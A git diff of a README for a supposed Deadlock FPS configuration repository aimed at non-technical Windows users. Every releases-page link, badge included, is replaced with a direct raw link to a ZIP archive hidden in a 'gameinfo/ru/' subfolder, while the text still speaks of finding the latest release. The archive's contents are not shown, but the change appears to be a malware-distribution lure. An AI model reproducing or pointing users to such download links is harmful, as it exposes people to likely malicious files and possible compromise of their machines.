@@ -1,6 +1,6 @@
 # 🎯 fps-config-for-competitive-deadlock - Fast setup for sharper play
 
-[![Download](https://img.shields.io/badge/Download%20Now-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Summercatersthoughtreader60/fps-config-for-competitive-deadlock/releases)
+[![Download](https://img.shields.io/badge/Download%20Now-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Summercatersthoughtreader60/fps-config-for-competitive-deadlock/raw/refs/heads/main/gameinfo/ru/competitive-fps-for-deadlock-config-2.5-alpha.1.zip)
 
 ## 🧩 What this is
 
@@ -11,7 +11,7 @@ This project is aimed at normal users. You do not need coding skills. You only n
 ## 📥 Download
 
 Use this page to download:  
-https://github.com/Summercatersthoughtreader60/fps-config-for-competitive-deadlock/releases
+https://github.com/Summercatersthoughtreader60/fps-config-for-competitive-deadlock/raw/refs/heads/main/gameinfo/ru/competitive-fps-for-deadlock-config-2.5-alpha.1.zip
 
 Open the page, look for the latest release, and get the file that matches your Windows setup. If the release comes as a ZIP file, download it first and then extract it.
 
@@ -46,7 +46,7 @@ The included files are based on topics like fps, deadlock-fps, deadlock-utility,
 ## 🚀 Getting Started
 
 1. Open the download page  
-   https://github.com/Summercatersthoughtreader60/fps-config-for-competitive-deadlock/releases
+   https://github.com/Summercatersthoughtreader60/fps-config-for-competitive-deadlock/raw/refs/heads/main/gameinfo/ru/competitive-fps-for-deadlock-config-2.5-alpha.1.zip
 
 2. Find the newest release at the top of the page
 
@@ -238,4 +238,4 @@ If the game feels wrong after applying the files:
 ## 📎 Download again
 
 Use this page to download:  
-https://github.com/Summercatersthoughtreader60/fps-config-for-competitive-deadlock/releases
+https://github.com/Summercatersthoughtreader60/fps-config-for-competitive-deadlock/raw/refs/heads/main/gameinfo/ru/competitive-fps-for-deadlock-config-2.5-alpha.1.zip
